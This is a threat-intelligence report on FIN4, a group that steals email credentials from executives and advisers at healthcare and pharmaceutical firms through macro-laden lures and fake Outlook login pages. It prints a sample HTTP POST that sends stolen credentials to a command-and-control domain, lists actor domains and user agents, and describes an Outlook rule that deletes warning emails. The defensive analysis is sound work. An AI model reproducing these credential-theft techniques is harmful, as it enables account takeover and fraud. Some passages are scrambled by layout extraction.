FIN4 Likely Playing the Market**\n\nireEye is currently tracking a group that\ntargets the email accounts of individuals\nprivy to the most confidential information of\n\n## F\n\nmore than 100 companies. The group, which we\ncall FIN4, appears to have a deep familiarity with\nbusiness deals and corporate communications, and\ntheir effects on financial markets. Operating since at\nleast mid-2013, FIN4 distinctly focuses on\ncompromising the accounts of individuals who\npossess non-public information about merger and\nacquisition (M&A) deals and major market-moving\nannouncements, particularly in the healthcare and\npharmaceutical industries. FIN4 has targeted\nindividuals such as top executives, legal counsel,\noutside consultants, and researchers, among others.\n\n\nWe are able to characterize FIN4’s activity from\nthe incidents to which we have responded in\nour clients’ networks, FIN4’s attempts to\ncompromise our managed service clients, our\nproduct detection data, and further independent\nresearch. Our visibility into FIN4’s activities is\nlimited to their network operations; we can only\nsurmise how they may be using and potentially\nbenefiting from the valuable information they\nare able to obtain. However one fact remains\nclear: access to insider information that could\nmake or break stock prices for dozens of publicly\ntraded companies could surely put FIN4 at a\nconsiderable trading advantage.\n\n\n###### KEY FINDINGS\n\n|100+ TARGETS|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|Since mid-2013, FIN4 has targeted over 100 organizations, all of which are either publicly traded companies or advisory firms that provide services such as investor relations, legal counsel, and investment banking.

Since at\nleast mid-2013, FIN4 has pursued targets at FIN4 frequently targets:\nmore than 100 organizations, over two-thirds of\nwhich are public healthcare and pharmaceutical                     - C-level executives and senior leadership\ncompanies. The remaining targets include                     - Legal counsel\nadvisory firms that represent public companies                     - Regulatory, risk, and compliance personnel\nand a handful of public companies in other                     - Researchers\nsectors closely followed by market watchers.                      - Scientists\nAll but three of the public companies are listed                      - People in other advisory roles\non the NYSE or NASDAQ, with the remaining\nthree listed on non-US exchanges.\n\n###### TARGETED ORGANIZATIONS: OVER 100 Other Publicly PUBLICLY TRADED Traded Companies COMPANIES AND 12%\n Publicly Traded\n ADVISORY FIRMS Healthcare and\n Pharmaceutical\n Firms Advising\n Companies\n Public Companies\n 68% on Securities, Legal\n and M&A Matters\n 20%\n\n**Figure 1: FIN4’s Targets**\n\n\n-----\n\n**Hacking the Street?

The group\nfrequently employs M&A-themed and SEC-themed\nlures with Visual Basic for Applications (VBA)\nmacros implemented to steal the usernames and\npasswords of these key individuals. Additionally,\nFIN4 has included links to fake Outlook Web App\n(OWA) login pages designed to capture the user’s\ncredentials. Once equipped with the credentials,\nFIN4 then has access to real-time email\ncommunications—and presumably insight into\npotential deals and their timing.\n\nMany of FIN4’s lures appeared to be stolen\ndocuments from actual deal discussions that the\ngroup then weaponized and sent to individuals\ndirectly involved in the deal. In some cases, the\ndiscussions were public knowledge and widely\nreported in the media, while others were still in the\nearly exploration and due diligence phases. In one\ninstance, we observed FIN4 simultaneously target\nfive different organizations involved in a single\nacquisition discussion. The group targeted\nindividuals at the five firms several months before\nthe organizations’ involvement in the acquisition\ntalks went public.\n\n\n###### Lasering in on Healthcare and Pharmaceuticals\nWe believe FIN4 heavily targets healthcare and\npharmaceutical companies as stocks in these\nindustries can move dramatically in response to\nnews of clinical trial results, regulatory decisions, or\nsafety and legal issues. In fact, many high-profile\ninsider trading cases involve the pharmaceutical\nsector. We’ve observed FIN4 access information\non a wide variety of issues—including drug\ndevelopment, insurance reimbursement rates, and\npending legal cases—all of which can significantly\ninfluence the price of healthcare industry stocks.\n\nIn one case, FIN4 targeted employees involved in\nMedicaid rebates and government purchasing\nprocesses - these issues can heavily influence stock\nprices. Healthcare and pharmaceutical companies\ndepend heavily on the decisions of large third party\npayers (like Medicaid) whose purchasing power and\nrebate decisions can make or break a company’s\nearnings. FIN4 would presumably use this\ninformation to evaluate healthcare companies’\nfuture revenue.\n\n\n-----\n\n**Hacking the Street? FIN4 Likely Playing the Market**\n\n###### FIN4’s campaign codes illustrate their interest in the organizations and job roles most likely to have access to market-moving information before it goes public.\n\n Keeping it Organized\nFIN4 organizes the targets of their activity with\nover 70 unique “campaign codes” to designate the\nemployer of the individuals they target, or in some\ncases the generic roles the targeted individuals play\nwithin that organization.\n\nFor example:\n\n          - CEO_CFO_COO_CORPDEV\n\n           - SCIENTISTS_AND_RESEARCH\n\n          - <PHARMACEUTICAL COMPANY NAME>\n\n          - <ADVISORY FIRM NAME>\n\n\nThese campaign codes function as labels that\nFIN4 uses to identify the origin of usernames\nand passwords stolen from their targets. These\ncampaign codes are transmitted to FIN4’s\ncommand and control (C2) servers along with\nstolen credentials.\n\n\n**Figure 3: Example of FIN4 Campaign Code**\n\n\n-----\n\n**Hacking the Street?

The embedded\n\n**Figure 4: FIN4 phishing email to an executive** **A**\n\nmacro displays a dialog box that mimics the\nWindows Authentication prompt for the user to\nenter their domain credentials.

In several instances, FIN4 has\ncomments about the company in general (executive compensation\nmainly) and you in specific (overpaid and incompetent). He gave included links to fake OWA login pages in their\ndetailed instances of his disagreements, and in doing so, may have phishing emails instead (Figure 4).

This email came from an\n\nThank you for the assistance,\n\naccount that FIN4 hijacked at a public company\n\n<name>\n\nand includes several watchwords: “disclosure” of\n“confidential company information regarding\npending transactions.” These specific issues are\nkey terms at public companies, where the public\ndisclosure of sensitive business information is\nstrictly regulated.\n\n\n-----\n\n**Hacking the Street? FIN4 Likely Playing the Market**\n\n\n**Figure 5: Generic FIN4 Lure Document**\n\n\nWhile a large share of FIN4’s lures are previously\nstolen confidential company documents, the group\noccasionally uses generic lures of interest to the\ninvestment community (Figure 5).\n\nFIN4 also uses existing email threads in a victim’s\ninbox to spread their weaponized documents. We’ve\nseen the actors seamlessly inject themselves into\nemail threads. FIN4’s emails would be incredibly\ndifficult to distinguish from a legitimate email sent\nfrom a previously compromised victim’s email\naccount. The actors have also Bcc’d all recipients,\nmaking it even more difficult for recipients to\ndecipher a malicious email from a legitimate one.\n\n\n###### A Fly on Many Walls\nIn several of our investigations, FIN4 targeted\nmultiple parties involved in a business deal,\nincluding law firms, consultants, and public\ncompanies. In one instance, FIN4 appeared to\nleverage its previously-acquired access to email\naccounts at an advisory firm (“Advisory Firm A”) to\ncollect data during a potential acquisition of one of\nAdvisory Firm A’s clients (“Public Company A”).\n\nFIN4 proceeded to send a spearphishing email\nfrom a compromised account at Advisory Firm A to\nanother advisory firm (“Advisory Firm B”), who was\nalso representing Public Company A. FIN4 used a\nSEC filing document as a lure. After news of the\npossible acquisition was made public, Public\nCompany A’s stock price varied significantly. It is\nlikely that FIN4 used the inside information they\nhad to capitalize on these stock fluctuations.\n\n\n-----\n\n**Hacking the Street?

FIN4 Likely Playing the Market**\n\n**Figure 6: Outlook rule to filter emails**\n\n###### Evading Detection\nFIN4 has been observed creating a rule in victims’\nMicrosoft Outlook accounts that automatically\ndeletes any emails that contain words such as\n“hacked”, “phish”, “malware”, etc. (Figure 6). The\ngroup likely implements these rules to prevent\ncompromised victims from receiving replies from\nintended targets that their email account may be\ncompromised, and likely buys FIN4 extra time\nbefore victim organizations detect their activities.\n\n\n###### Conclusion\nIf FIN4’s activities are indeed part of a sustained\neffort to gain advance access to market-moving\ninformation, it would not be the first time that\nnetwork intrusions have played a role in an insider\ntrading case. However the scale of FIN4’s\noperations, with targets at more than 100 public\ncompanies, coupled with their tactic of going after\nkey individuals’ emails, sets this group apart.\n\nOur visibility into FIN4 is limited to their network\noperations, so we cannot say for certain what\nhappens after they gain access to insider\ninformation. What we can say is that FIN4’s\nnetwork activities must reap enough benefit to\nmake these operations worth supporting for over a\nyear—and in fact, FIN4 continues to compromise\nnew victims as we finish this report.\n\n\n-----\n\n**Hacking the Street? FIN4 Likely Playing the Market**\n\n###### APPENDIX: TACTICS\n\nFIN4 employs a simple, yet effective, method to\ngather targets’ user credentials through their\nspearphishing emails. Using VBA macros, they\nembed malicious code into already existing and\nlegitimate company documents. Embedded in\neach Microsoft Word or Excel document is a\nmalicious macro that prompts the user for their\nOutlook credentials. We have also observed this\ngroup send emails with links to fake Outlook Web\nApp (OWA) login pages that will also steal the\nuser’s credentials, however we have not observed\nthis tactic in recent months.\n\n\n###### VBA Macros Embedded into Legitimate Documents\nThe embedded VBA macro consists of a module\ntypically entitled “Module1” and a user form that\nhas been called both “UserForm1” and\n“UserLoginForm”. The code in Module1 contains\nthe information needed to communicate with the\nC2 server (Figure 7).\n\n\n**Figure 7: Example of**\n“Module1” used in\none of the most\nrecent campaigns\n\n\n-----\n\n**Hacking the Street? FIN4 Likely Playing the Market**\n\n\n**Figure 8: Example of “UserForm1” with Campaign Code**\n\n\nThe userform contains the code for the user\ncredentials prompt and an artifact that is highly\nindicative of the actors’ targeting. The artifact (a\ncampaign code) is usually tailored to the particular\ntarget company or the company from which they\nare targeting others; alternately, the artifact may\nrepresent a generic role for targeted individuals,\nsuch as SCIENTISTS_AND_RESEARCH or\nCEO_CFO_COO_CORPDEV. We have identified\nover 70 unique campaign codes to date. This\ncampaign code is transmitted to the C2 server\n\n\nalong with the victim’s username and password, as\nseen in Figure 8.\n\nMany of the fake Outlook windows opened by the\nmacros contain the logo of the company targeted\ngiving the pop-up apparent legitimacy. Figure 9\nbelow represents a generic pop-up, with no\ncompany-specific information that a user might\nsee after opening the document. Only after\ncredentials are entered will the document appear\nfor the user.\n\n\n**Figure 9: Malicious Dialogue that Prompts for User’s Credentials**\n\n\n-----\n\n**Hacking the Street? FIN4 Likely Playing the Market**\n\n\n**Figure 10: POST Request Containing User’s Credentials Sent to C2**\n```\n    POST /report.php?msg=FAKE_PHARMA&uname=john.doe&pword=abc123 HTTP/1.1\n    Connection: Keep-Alive\n    Content-Type: text/plain; Charset=UTF-8\n    Accept: */*\n    Accept-Language: en-us\n    User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\n    Trident/6.0)\n    Content-Length: 0\n    Host: www.junomaat81.us\n\n```\n\n###### Networking and Infrastructure\nAfter the user enters data into the username and\npassword fields, the data is transmitted to the C2\nserver via a POST request (Figure 10). FIN4 then\nuses the collected credentials to login to victim\nemail accounts. In addition to gaining access to the\nvictim’s private communications, FIN4 also uses\nthe compromised accounts to email malicious\ndocuments to additional targets inside and outside\nthe victim company. The group is currently active\nas this report goes to publication and recently\nused the domains junomaat81[.]us and\nlifehealthsanfrancisco2015[.]com as their C2s.\n\n\nFIN4 appears to be heavily reliant on Tor (software\nthat enables users to browse the Internet\nanonymously by encrypting their internet traffic\nand routing it through servers around the world)\nand has been seen using Tor to login to victims’\nemail accounts after obtaining the compromised\nuser credentials. We have detected at least two\nUser Agents that the actors have used and which\ncan be used to identify potentially suspicious OWA\nactivity in network logs, when paired with\noriginating Tor IP addresses.\n\n```\nMozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0\nMozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0\n\n```\n\n**Figure 11: FIN4 User Agents**\n\n\n-----\n\n**Hacking the Street?

There are also legitimate\ndomains that appear to have been compromised\nand used in previous campaigns in late 2013 and\nearly 2014; however in the recent months we\nhave not seen indications that the actor has used\ncompromised legitimate domains to conduct\ntheir operations.\n\n###### What Can Network Defenders Do?\nThe relative simplicity of FIN4’s tactics\n(spearphishing, theft of valid credentials, lack\nof any malware installed on victim machines)\nmakes their intrusion activity difficult to detect.\nHowever a few basic security measures can help\n\n|Actor-Registered C2 Domains|Col2|\n|---|---|\n|ellismikepage[.]info|lifehealthsanfrancisco2015[.]com|\n|rpgallerynow[.]info|dmforever[.]biz|\n|msoutexchange[.]us|junomaat81[.]us|\n|outlookscansafe[.]net|nickgoodsite.co[.]uk|\n|outlookexchange[.]net||\n\n\nthwart the group’s efforts. Disabling VBA macros\nin Microsoft Office by default, as well as blocking\nthe domains listed in Table 1 will help protect\nagainst FIN4’s current activities. Additionally,\nenabling two-factor authentication for OWA and\nany other remote access mechanisms can help\nprevent credentials stolen in this manner from\nbeing leveraged successfully. Companies can also\ncheck their network logs for OWA logins from\nknown Tor exit nodes if they suspect they are\nvictimized. Typically, legitimate users do not use\nTor for accessing email. While not conclusive, if\npaired with known targeting by this group, the\naccess from Tor exit nodes can serve as an\nindicator of the group’s illicit logins.\n\n\n-----\n\n**Hacking the Street?
